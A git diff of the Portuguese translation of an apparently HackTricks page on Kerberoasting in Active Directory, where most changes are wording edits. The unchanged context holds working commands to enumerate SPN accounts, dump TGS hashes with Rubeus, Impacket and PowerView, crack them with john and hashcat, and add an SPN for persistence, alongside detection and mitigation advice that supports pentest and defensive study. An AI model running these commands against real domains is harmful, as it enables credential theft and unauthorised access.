@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
@@ -12,7 +12,7 @@ Acesse hoje:
 
 <summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
@@ -24,16 +24,16 @@ Outras formas de apoiar o HackTricks:
 
 ## Kerberoast
 
-O Kerberoasting foca na aquisição de **tickets TGS**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que se originam das **senhas de usuário**, permitindo a possibilidade de **quebra offline de credenciais**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.
+O Kerberoasting foca na aquisição de **tickets TGS**, especificamente aqueles relacionados a serviços operando sob **contas de usuário** no **Active Directory (AD)**, excluindo **contas de computador**. A criptografia desses tickets utiliza chaves que se originam das **senhas dos usuários**, permitindo a possibilidade de **quebra offline de credenciais**. O uso de uma conta de usuário como serviço é indicado por uma propriedade **"ServicePrincipalName"** não vazia.
 
 Para executar o **Kerberoasting**, uma conta de domínio capaz de solicitar **tickets TGS** é essencial; no entanto, esse processo não exige **privilégios especiais**, tornando-o acessível a qualquer pessoa com **credenciais de domínio válidas**.
 
-### Pontos-chave:
+### Pontos Chave:
 
 * O **Kerberoasting** visa os **tickets TGS** para **serviços de contas de usuário** dentro do **AD**.
-* Tickets criptografados com chaves de **senhas de usuário** podem ser **quebrados offline**.
+* Tickets criptografados com chaves das **senhas dos usuários** podem ser **quebrados offline**.
 * Um serviço é identificado por um **ServicePrincipalName** que não é nulo.
-* **Não são necessários privilégios especiais**, apenas **credenciais de domínio válidas**.
+* **Nenhum privilégio especial** é necessário, apenas **credenciais de domínio válidas**.
 
 ### **Ataque**
 
@@ -53,21 +53,21 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Ferramentas com várias funcionalidades, incluindo um dump de usuários vulneráveis ao ataque Kerberoast:
+Ferramentas com várias funcionalidades, incluindo um dump de usuários que podem ser alvos de Kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-* **Enumerar usuários Kerberoastable**
+* **Enumerar usuários suscetíveis ao ataque Kerberoast**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **Técnica 1: Solicitar TGS e despejá-lo da memória**
+* **Técnica 1: Solicitar o TGS e extraí-lo da memória**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -107,15 +107,15 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 Quando um TGS é solicitado, o evento do Windows `4769 - Um ticket de serviço Kerberos foi solicitado` é gerado.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com base nas ferramentas comunitárias **mais avançadas do mundo**.\
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir facilmente e **automatizar fluxos de trabalho** com base nas ferramentas comunitárias **mais avançadas** do mundo.\
 Acesse hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-### Quebra
+### Quebrando
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -123,7 +123,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Persistência
 
-Se você tiver **permissões suficientes** sobre um usuário, você pode **torná-lo passível de kerberoasting**:
+Se você tiver **permissões suficientes** sobre um usuário, você pode **torná-lo passível de kerberoast**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
@@ -148,14 +148,14 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 ```
 Para mitigar o risco de Kerberoasting:
 
-* Garanta que as **Senhas de Contas de Serviço sejam difíceis de adivinhar**, recomendando um comprimento de mais de **25 caracteres**.
-* Utilize **Contas de Serviço Gerenciadas**, que oferecem benefícios como **alterações automáticas de senha** e **gerenciamento delegado de Service Principal Name (SPN)**, aprimorando a segurança contra tais ataques.
+* Garantir que as **Senhas de Contas de Serviço sejam difíceis de adivinhar**, recomendando um comprimento de mais de **25 caracteres**.
+* Utilizar **Contas de Serviço Gerenciadas**, que oferecem benefícios como **alterações automáticas de senha** e **gerenciamento delegado de Service Principal Name (SPN)**, aumentando a segurança contra tais ataques.
 
 Ao implementar essas medidas, as organizações podem reduzir significativamente o risco associado ao Kerberoasting.
 
 ## Kerberoast sem conta de domínio
 
-Em **setembro de 2022**, uma nova maneira de explorar um sistema foi revelada por um pesquisador chamado Charlie Clark, compartilhada por meio de sua plataforma [exploit.ph](https://exploit.ph/). Este método permite a aquisição de **Service Tickets (ST)** por meio de uma solicitação **KRB\_AS\_REQ**, o que não requer controle sobre nenhuma conta do Active Directory. Essencialmente, se um principal estiver configurado de forma a não exigir autenticação prévia - um cenário semelhante ao que é conhecido no mundo da cibersegurança como um ataque de **AS-REP Roasting** - essa característica pode ser aproveitada para manipular o processo de solicitação. Especificamente, ao alterar o atributo **sname** dentro do corpo da solicitação, o sistema é enganado a emitir um **ST** em vez do Ticket Granting Ticket (TGT) criptografado padrão.
+Em **setembro de 2022**, uma nova maneira de explorar um sistema foi revelada por um pesquisador chamado Charlie Clark, compartilhada por meio de sua plataforma [exploit.ph](https://exploit.ph/). Este método permite a aquisição de **Service Tickets (ST)** por meio de uma solicitação **KRB\_AS\_REQ**, o que não exige controle sobre nenhuma conta do Active Directory. Essencialmente, se um principal estiver configurado de tal forma que não exija pré-autenticação - um cenário semelhante ao que é conhecido no mundo da cibersegurança como um ataque de **AS-REP Roasting** - essa característica pode ser aproveitada para manipular o processo de solicitação. Especificamente, ao alterar o atributo **sname** dentro do corpo da solicitação, o sistema é enganado para emitir um **ST** em vez do Ticket Granting Ticket (TGT) criptografado padrão.
 
 A técnica é totalmente explicada neste artigo: [post do blog da Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -187,15 +187,15 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 
 Outras formas de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas comunitárias mais avançadas do mundo**.\
